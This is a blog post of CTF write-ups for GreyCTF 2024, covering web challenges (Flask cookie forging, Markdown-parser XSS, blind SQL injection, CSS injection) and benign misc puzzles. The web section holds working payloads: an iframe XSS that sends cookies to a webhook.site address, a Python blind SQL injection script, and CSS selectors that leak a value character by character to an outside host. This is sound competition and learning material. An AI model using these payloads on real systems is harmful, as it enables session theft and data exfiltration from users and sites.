---
title: GreyCTF 2024 Writeups
date: 2024-04-21
tags: Web
categories: CTF Writeups
---
I participated under team **youtiaos** and we ended 1st place local.

![scoreboard](/img/greyctf-2024/scoreboard.png)

I was solving in the web and misc categories. The specific challenges I solved are in the image below.

![challenges](/img/greyctf-2024/challenges.png)

I'll update this writeup with the flags once the challenges are back up.

# Web Challenges
## Baby Web
The website uses Flask session cookies but the secret key is given unchanged in the source code. Sign another cookie with `is_admin=True` and proceed to spend 10 minutes finding for a hidden element on the admin page to get the flag. 

## GreyCTF Survey
The form limits the user submitted survey score using `vote < 1 && vote > -1`, and calls `parseInt(vote)` in an effort to "round" all votes to 0. Javascript's `parseInt` is awful at handling small decimal numbers as per [this article](https://priyankuhazarika.hashnode.dev/weird-javascript-the-strange-behaviour-of-parseint). We can submit a small enough decimal number and get the flag. 
 

## Markdown Parser
```js
lines.forEach(line => {
        if (inCodeBlock) {
            if (line.startsWith('```')) {
                inCodeBlock = false;
                htmlOutput += '</code></pre>';
            } else {
                htmlOutput += escapeHtml(line) + '\n';
            }
        } else {
            if (line.startsWith('```')) {
                language = line.substring(3).trim();
                inCodeBlock = true;
                htmlOutput += '<pre><code class="language-' + language + '">';
                console.log(htmlOutput);
            } else {
                line = escapeHtml(line);
                ...  // More escaping
                htmlOutput += line;
            }
        }
    });
```

For some reason the parser ignores anything on the line of the code block quotes. We can take advantage of this by injecting an element that can steal cookies on Chromium browsers.

```html
```python">asss<iframe onload="document.location='https://webhook.site/???/?c='+document.cookie" href="
```

## Fearless Concurrency
The application leaks the user secret by creating a table with a randomised name, performing an SQL injectable query, and dropping the table right after. To give us enough time to extract the table name, we'll have to inject a `SLEEP(n)` into the query so that the application doesn't drop our table.

```sql
H%' AND SLEEP(7); -- 
```

Now we need to use blind SQL injection to extract our table name, but the user we slept on cannot be used as the application assigns a mutex to each user that is acquired on performing any database operation:

```rs
impl User {
    fn new() -> User {
        User {
            lock: Arc::new(Mutex::new(())),
            secret: rand::random::<u32>()
        }
    }
}
```

However, since this is per-user, we can simply register another user and extract from there. Since we know our previous user's id, all we need now is to brute force the randomly generated `table_id` with a search space of `u32`.

```python
import requests
import json
import requests_async
user1_id = 3536229236652552362
user1_pass = 3014427053
user2_id = 2725506906259309759
user1_hashed_prefix = "tbl_328b62706e834f61616399736a6a1fa35da2f0a0_"
url = 'http://challs.nusgreyhats.org:33333/query'
headers = {'Content-Type': 'application/json'}
table_name = user1_hashed_prefix
while True:
    check = False
    for char in "0123456789":
        payload = {
            "user_id": user2_id,
            "query_string": "H%' AND (SELECT SUBSTRING(table_name, " + str(len(table_name) + 1) + ", 1) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '" + user1_hashed_prefix + "%' LIMIT 0,1) = '" + char + "'; -- "
        }
        response = requests.post(url, headers=headers, data=json.dumps(payload))
        if b"Hello" in response.content:
            table_name += char
            print(table_name)
            check = True
            break
    if not check:
        break
payload = {
    "user_id": user2_id,
    "query_string": "' UNION SELECT * FROM " + table_name + "; -- "
}
response = requests.post(url, headers=headers, data=json.dumps(payload))
print(response.content)
```

After getting the user's secret, we can simply submit it along with the user id to get the flag.

## Beautiful Styles
We see that the flag is held in `<input id="flag" value="{{ flag }}">`. We can steal this character by character using CSS:

```css
for i in "0123456789ABCDEFGHIJKLMNOPQRSTUVQXYZ{}f":
		print('input[id="flag"][value^="grey{' + i + '"] {background: url("https://webhook.site/???/?char=' + i + '")}')
```

More information [here](https://aszx87410.github.io/beyond-xss/en/ch3/css-injection/). I extracted the flag by hand, as scripting this challenge surely would've taken more time.

# Misc Challenges
I'm only going to go through the relatively harder ones.

## Maze Runner
This problem looks exactly like the one in [this geeksforgeeks article](https://www.geeksforgeeks.org/shortest-path-by-removing-k-walls/), so hopefully we can just repurpose their code. The maze uses thin walls, and as per [this stackoverflow answer](https://stackoverflow.com/a/78294870), we can simply represent the maze as a 2d array and reduce the number of steps by half later.

```python
from pwn import *
from collections import deque
import itertools
c = remote('challs.nusgreyhats.org',31112)
def shortestPath(mat, k):
    # Credit to https://www.geeksforgeeks.org/shortest-path-by-removing-k-walls/
    ...
    return steps
level = 0
for i in range(50):
    level += 1
    print(level)
    c.recvuntil(f'{level}:\n'.encode())
    walls = "┏━┃╹┛┓┗┣╻━┳┻╋┫"
    maze = []
    breakable_walls = []
    row = c.recvline().decode().strip()
    row_decoded = []
    i = 0
    while i < len(row):
        if row[i] in walls:
            row_decoded.append(1)
        else:
            row_decoded.append(0)
        i += 1
        if i < len(row) and row[i] in walls:
            row_decoded.append(1)
        else:
            row_decoded.append(0)
        i += 3
    for t in range(len(maze[0]) - 2):  # Ignore top and bottom border
        row = c.recvline().decode().strip()
        row_decoded = []
        i = 0
        while i < len(row):
            if row[i] in walls:
                row_decoded.append(1)
                if t % 2 == 0 and (0 < len(row_decoded) - 1 < len(maze[0]) - 1):
                    breakable_walls.append((t + 1, len(row_decoded) - 1))
            elif t % 2 == 1:
                row_decoded.append(1)
            else:
                row_decoded.append(0)
            i += 1
            if i < len(row) and row[i] in walls:
                row_decoded.append(1)
                if t % 2 == 1 and (0 < len(row_decoded) - 1 < len(maze[0]) - 1):
                    breakable_walls.append((t + 1, len(row_decoded) - 1))
            else:
                row_decoded.append(0)
            i += 3
        
        maze.append(row_decoded[:-1])
    maze = [row[1:-1] for row in maze]  # Ignore left and right border
    c.recvuntil(b'given ')
    phases = int(c.recvuntil(b' ').decode())
    
    start = (1, 1)
    end = (len(maze) - 2, len(maze[0]) - 2)
    steps = int(shortestPath(maze, phases) / 2)
    c.recvuntil(b'escape? \n')
    c.sendline(str(steps).encode())
c.interactive()
```

## Tones
Opening up the wav files in audacity and viewing the spectrograms, we can deduce two things:
1. Each character is encoded into 3 notes.
2. There are 7 unique discrete notes.

This screams base7 encoding, and it was. Simply decoding the frequencies by setting the lowest frequency to 0 and the highest to 6 gives us the flag.

```
205 222 203 232 234 230 206 232 164 224 206 102 164 106 204 223 212 164 204 222 102 221 225 102 215 201 232 164 223 206 100 204 224 164 066 102 103 111 211 204 066 203 222 211 204 111 211 202 223 205 202 204 205 236
```

```
grey{why_th3_7fsk_fr3qu3ncy_sh1ft_0349jf0erjf9jdsgdfg}
```

## Verilog Count
The server asks you for a Verilog script, but the issue is that a few keywords are banned: `if`, `else`, `?`, and `+`. This means that simple addition and conditionals are out of the gate.

This was my first time touching Verilog. From my experience in digital electronics, I knew that what I needed was a ripple carry counter, which is a line of flip-flops through which the clock pulse gets carried. More information [here](https://www.javatpoint.com/ripple-counter-in-digital-electronics). Only problem now was that I needed to know how to write in Verilog.

It took me ages to learn what I needed to learn, but my final `solve.v` is below. I'll go through a few problems I experienced further down.

```verilog
module counter
(
    input clk,
    output [31:0] q
);
	logic reset;
	initial begin
		reset = 1'b1;
		#1;
		reset = 1'b0;
	end
    t_ff tff0(q[0], !clk, reset);
	t_ff tff1(q[1], q[0], reset);
	t_ff tff2(q[2], q[1], reset);
	t_ff tff3(q[3], q[2], reset);
	t_ff tff4(q[4], q[3], reset);
	t_ff tff5(q[5], q[4], reset);
	t_ff tff6(q[6], q[5], reset);
	t_ff tff7(q[7], q[6], reset);
	t_ff tff8(q[8], q[7], reset);
	t_ff tff9(q[9], q[8], reset);
	t_ff tff10(q[10], q[9], reset);
	t_ff tff11(q[11], q[10], reset);
	t_ff tff12(q[12], q[11], reset);
	t_ff tff13(q[13], q[12], reset);
	t_ff tff14(q[14], q[13], reset);
	t_ff tff15(q[15], q[14], reset);
	t_ff tff16(q[16], q[15], reset);
	t_ff tff17(q[17], q[16], reset);
	t_ff tff18(q[18], q[17], reset);
	t_ff tff19(q[19], q[18], reset);
	t_ff tff20(q[20], q[19], reset);
	t_ff tff21(q[21], q[20], reset);
	t_ff tff22(q[22], q[21], reset);
	t_ff tff23(q[23], q[22], reset);
	t_ff tff24(q[24], q[23], reset);
	t_ff tff25(q[25], q[24], reset);
	t_ff tff26(q[26], q[25], reset);
	t_ff tff27(q[27], q[26], reset);
	t_ff tff28(q[28], q[27], reset);
	t_ff tff29(q[29], q[28], reset);
	t_ff tff30(q[30], q[29], reset);
	t_ff tff31(q[31], q[30], reset);
endmodule
module t_ff
(
        q,
        clk,
        rst
);
output  q;
input   clk;
input   rst;
wire    d;
d_ff dff0(q, d, clk, rst);
not n1(d, q);
endmodule
module d_ff
(
        q,
        d,
        clk,
        rst
);
output  q;
input   d;
input   clk;
input   rst;
reg     q;
always @ (negedge clk or posedge rst)
begin
        q <= (~rst & d) | (rst & 1'b0);
end
endmodule
```

In the `initial begin` block in the `counter` module, I initially had `reset = 1'b1;`, and `reset = 1'b0` was after the T-flip-flop calls. This gave me a counter, but it didn't incrememt on the first clock cycle. After some debugging, I found out that it was because the `reset` signal is set to `1'b1` at the beginning and then immediately set to `1'b0` on the first positive edge of the clock, meaning that the counter is effectively reset on the first clock cycle.

There was also the issue of not using any conditional statements, which I needed for the D-flip-flop. This issue was a lot simpler as we can use the `AND` operation to select between the two values based on the `reset` signal.

# Final Thoughts
Great CTF, excited for finals.
